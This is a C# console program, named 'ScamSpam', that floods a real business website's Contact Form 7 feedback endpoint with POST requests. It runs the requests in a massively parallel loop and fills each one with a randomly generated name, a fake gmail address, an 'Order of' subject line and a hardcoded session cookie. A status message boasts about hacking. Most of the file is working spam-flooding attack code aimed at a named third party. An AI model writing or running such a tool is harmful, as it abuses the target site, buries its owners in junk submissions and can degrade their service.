using System;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Konsole;
using RandomFriendlyNameGenerator;
using RestSharp;
using System.Diagnostics;
using Konsole.Internal;
using static System.ConsoleColor;

namespace ScamSpam
{
    class Program
    {
        //TODO: get a feed of stock symbols, and allow user to pick stock prices from column B, and add to monitor
        //      on left. use fake (and real) stock service
        static bool finished = false;
        static Func<bool> rand = () => new Random().Next(100) > 49;
        public static void Main(string[] args)
        {
            TimeSpan timeOut = new TimeSpan(10, 0, 0, 0, 0);
            var options = new RestClientOptions("https://www.groenetafel.com/wp-json/contact-form-7/v1/contact-forms/50635/feedback")
            {
                ThrowOnAnyError = true,
                Timeout = timeOut
            };
            var client = new RestClient(options);
            using var writer = new HighSpeedWriter();
            var window = new Window(writer);
            int counter = 1;

            window.CursorVisible = false;

            var left = window.SplitLeft();
            var leftConsoles = left.SplitRows(
                new Split(0),
                new Split(9, "status"),
                new Split(10)
                );

            var status = leftConsoles[1];
            status.BackgroundColor = Yellow;
            status.ForegroundColor = Red;
            status.Clear();

            var stocksCon = leftConsoles[0];
            //var menuCon = leftConsoles[2];
            var namesCon = window.SplitRight("Response");

            var r = new Random();


            var t3 = Task.Run(() =>
            {
                while (!finished)
                {
                    Thread.Sleep(r.Next(2000));
                }
            });

            // print random names in random colors 
            // and demonstrate scrolling and wrapping at high speed
            var t1 = Task.Run(() =>
            {
                var names = TestData.MakeNames(500);
                //WriteAttackCount();
                var FTSE100Con = stocksCon.SplitLeft("Count");
                var NYSECon = stocksCon.SplitRight("Name");

                int highestA = 0;

                while (!finished)
                {

                    // fill a screen full before flushing
                    // this is super quick because writer 
                    // simply writes to a buffer and no actual
                    // slow IO has happened yet
                    Parallel.For(1, 1000000000, new ParallelOptions { MaxDegreeOfParallelism = -1 }, (i, state) =>
                    {
                        writer.Flush();
                        var color = (ConsoleColor)(r.Next(100) % 16);

                        String name = NameGenerator.PersonNames.Get();
                        IConsole con;
                        con = NYSECon;
                        con.Write(name + "\n");

                        IConsole countCon = FTSE100Con;
                        if (highestA < counter)
                        {
                            countCon.Clear();
                            countCon.Write($"{counter} in thread {Thread.CurrentThread.ManagedThreadId}");
                        }
                      
                        var request = new RestRequest("form");
                        request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        request.AddHeader("Cookie", "PHPSESSID=491u1rc7oeqhqvstaqqtjtum9h");
                        //request.AddParameter("ua", "");
                        //request.AddParameter("state", "");
                        request.AddParameter("your-name", name);
                        request.AddParameter("your-email", name.Replace(" ", ".") + "@gmail.com");
                        //request.AddParameter("pass", CreatePassword(80));
                        request.AddParameter("your-subject", "Order of " + name);

                        RestResponse response = client.ExecutePost(request);
                        Console.WriteLine(response.Content);
                        i++;
                        Interlocked.Increment(ref counter);
                        //WriteAttackCount();
                        Thread.Sleep(10000);

                        //namesCon.Write($" {name}");
                        namesCon.Write(color, $"  {response.Content}");
                        writer.Flush();
                    });
                }
            });



            // create a menu inside the menu console window
            // the menu will write updates to the status console window

            //var menu = new Menu(menuCon, "Menu", ConsoleKey.Escape, 30,
            //    new MenuItem('s', "slow", () =>
            //    {
            //        speed = 200;
            //        status.Write(White, $" : {DateTime.Now.ToString("HH:mm:ss - ")}");
            //        status.WriteLine(Green, $" SLOW ");
            //        crazyFast = false;
            //    }),
            //    new MenuItem('f', "fast", () =>
            //    {
            //        speed = 10;
            //        status.Write(White, $" : {DateTime.Now.ToString("HH:mm:ss - ")}");
            //        status.WriteLine(White, $" FAST ");
            //        crazyFast = false;
            //    }),
            //    new MenuItem('c', "crazy fast", () =>
            //    {
            //        speed = 1;
            //        crazyFast = true;
            //        status.Write(White, $" : {DateTime.Now.ToString("HH:mm:SS - ")}");
            //        status.WriteLine(Red, $" CRAZY FAST ");
            //    })

            //);

            status.WriteLine("Poggers wat een hacken weer");

            // menu writes to the console automatically,
            // but because we're using a buffered screen writer
            // we need to flush the UI after any menu action.
            //menu.OnAfterMenuItem = _ => writer.Flush();

            //menu.Run();
            // menu will block until user presses the exit key.

            //finished = true;
            Task.WaitAll(t1, t3);

            window.Clear();
            window.WriteLine("thank you for flying Konsole air.");
            writer.Flush();

            string CreatePassword(int length)
            {
                const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
                StringBuilder res = new StringBuilder();
                Random rnd = new Random();
                while (0 < length--)
                {
                    res.Append(valid[rnd.Next(valid.Length)]);
                }
                return res.ToString();
            }
        }
    }
}